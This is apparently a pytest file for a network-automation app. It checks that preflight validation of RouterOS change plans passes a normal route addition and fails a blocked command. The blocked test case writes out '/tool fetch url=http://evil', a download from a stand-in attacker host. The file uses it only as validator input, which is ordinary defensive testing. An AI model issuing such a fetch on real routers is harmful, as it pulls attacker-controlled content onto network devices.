import json

from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

from app.models import Base, ChangePlan, Device, DeviceCredential
from app.services import config_planner
from app.services.config_planner import run_preflight


def _install_temp_db(monkeypatch):
    engine = create_engine("sqlite:///:memory:", future=True)
    Base.metadata.create_all(bind=engine)
    session_local = sessionmaker(bind=engine, autoflush=False, autocommit=False, expire_on_commit=False)
    monkeypatch.setattr(config_planner, "init_db", lambda: None)
    monkeypatch.setattr(config_planner, "get_session", session_local)
    return session_local


def _add_plan(session_local, *, blocked: bool = False):
    metadata = {
        "platform": "mikrotik_routeros",
        "precheck_commands": ["/ip route print"],
        "verification_commands": ["/ip route print"],
        "requires_double_confirmation": True,
    }
    proposed = "/tool fetch url=http://evil" if blocked else "/ip route add gateway=192.168.88.1 comment=\"NA-PLAN-1\""
    with session_local() as session:
        device = Device(ip_address="192.168.88.1", vendor_guess="MikroTik")
        device.credentials = [DeviceCredential(username="admin", encrypted_password="x", connection_type="ssh", platform_hint="mikrotik_routeros")]
        session.add(device)
        session.flush()
        plan = ChangePlan(
            device=device,
            plan_type="custom_routeros_plan",
            title="Custom route",
            description="custom",
            risk_level="high",
            status="approved",
            proposed_commands=proposed,
            rollback_commands="/ip route remove [find comment=\"NA-PLAN-1\"]",
            validation_findings="[]",
            custom_plan_metadata_json=json.dumps(metadata),
        )
        session.add(plan)
        session.commit()
        return plan.id


def test_custom_preflight_passes_with_double_confirmation_flag(monkeypatch):
    session_local = _install_temp_db(monkeypatch)
    plan_id = _add_plan(session_local)

    result = run_preflight(plan_id)

    assert result.plan.preflight_status == "passed"
    assert any(finding.title == "Double confirmation required" for finding in result.findings)


def test_custom_preflight_fails_for_blocked_command(monkeypatch):
    session_local = _install_temp_db(monkeypatch)
    plan_id = _add_plan(session_local, blocked=True)

    result = run_preflight(plan_id)

    assert result.plan.preflight_status == "failed"
    assert any(finding.title == "Blocked custom command" for finding in result.findings)
